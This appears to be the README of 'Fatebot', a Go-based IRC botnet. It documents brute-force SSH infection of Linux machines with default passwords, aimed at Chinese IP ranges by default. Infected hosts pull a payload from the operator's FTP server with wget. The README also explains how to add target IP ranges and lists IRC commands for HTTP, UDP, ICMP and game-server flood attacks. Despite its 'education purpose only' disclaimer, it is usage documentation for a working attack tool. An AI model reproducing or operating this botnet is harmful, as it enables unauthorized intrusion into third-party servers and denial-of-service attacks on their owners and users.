<h2>Attention Attention!!! My english is terrible. I'm so sorry about that :( </h2>

# Fatebot
This is my first IRC botnet for launch Denial of Service attack. Scan target are anything that run linux, Open default SSH port, Use default username and password. This bot are write in Go language. <strong>For education purpose only. Please test it in your lab, I create this for join university in the future not for attack anyone server with out any permission!!!</strong>

<strong>IRC commands are in the bottom of The page.</strong>

<img src="assets/fatebot.png" alt="Fatebot">

# Infect
The infect function of this bot is scanning by default SSH port<strong>(Scan on range of CHN network by default. You can add more or change it, If you want.)</strong>
and login by Brute-force attack. This botnet will use "wget" to get payload from FTP server, So... Please prepair your FTP server first, It's very important for infect process.

# Add more IP range

(1) Go to "scan.go" file in pkg folder. Add your new ip range in to The group of const varible.

		var_name = "224." //224.0.0.0 - 224.255.255.255
		or
		var_name = "224.12" //224.12.255.255

(2) Go to "NextIP" function and add The case for your ip range and return range of your ip.

		case var_name:
				return manageRange(ipRange, genRange(255, 0))
				
(2.1) In case of The ip range That you don't want to custom your second network prefix.
	
	Example:
	
		var_name = "224.12"
		var_name = "224.20"
		
	#The ip range that look like this it will return range of The id since 0 - 255 by default.
	#So... That's mean you don't need to add a case of your ip range.
	

(3) Then go to The "SSH_Conn" function and add your ip constant to The slice name "netList".

		netList := []string{
			ip1, ip2, ip3, ip4, ip5, ip6, ip7, ip8,
			ip9, ip10, ip11, var_name,
		}
		
<strong>I use shodan to do a static and analysis of scanning like how many of ssh port are open on which isp/org. What is the most used OS, version and etc.</strong>

# DDoS
Raw socket programming is really hard for me. That's why all of <strong>The volumetric</strong> are a simple like udp and icmp flood.
Main DDoS function is on <strong>The Application layer</strong>.


<img src="assets/postfloodtraffic.png" alt="http post flood, dos example">

# Build payload

# IRC Commands
<ul>
  <li><strong>?get [url]</li></strong>
    <ul>
      <li>?get http://target.com</li>
      - Flood HTTP get request to target.
    </ul>
</ul>

<ul>
  <li><strong>?post [url]</li></strong>
    <ul>
      <li>?post http://target.com</li>
      - Flood HTTP post request to target.
    </ul>
</ul>

<ul>
  <li><strong>?udp [ip] [size]</li></strong>
    <ul>
      <li>?udp 192.168.1.16 500</li>
      - Flood UDP packets by random src and dst port to target. 
      <p>- Min and Max of Buffer is 1 - 700bytes.</p>
    </ul>
</ul>

<ul>
  <li><strong>?icmp [ip]</li></strong>
    <ul>
      <li>?icmp 192.168.1.16</li>
      - Flood ICMP with large packets to target.
    </ul>
</ul>

<ul>
  <li><strong>?vse [ip]</li></strong>
    <ul>
      <li>?vse 192.168.1.16</li>
      - Flood TSource Engine Query request(UDP) on valve source engine dst port, By random src port. To the target server that used to host online games.
    </ul>
</ul>

<ul>
  <li><strong>?scan [ftp server]</li></strong>
    <ul>
      <li>?scan ftp://192.186.1.16/payload</li>
      - Scan CHN ip range(By default.) on SSH port and get payload with wget.
    </ul>
</ul>

<ul>
  <li><strong>?info</li></strong>
    <ul>
      - Get bot system information, For bot analysis.
    </ul>
</ul>

<ul>
  <li><strong>?kill</li></strong>
    <ul>
      - Bot self-close.
    </ul>
</ul>

<ul>
  <li><strong>?stopddos</li></strong>
    <ul>
      - Stop ddos attacking.
    </ul>
</ul>

<ul>
  <li><strong>?stopscan</li></strong>
    <ul>
      - Stop scanning.
    </ul>
</ul>
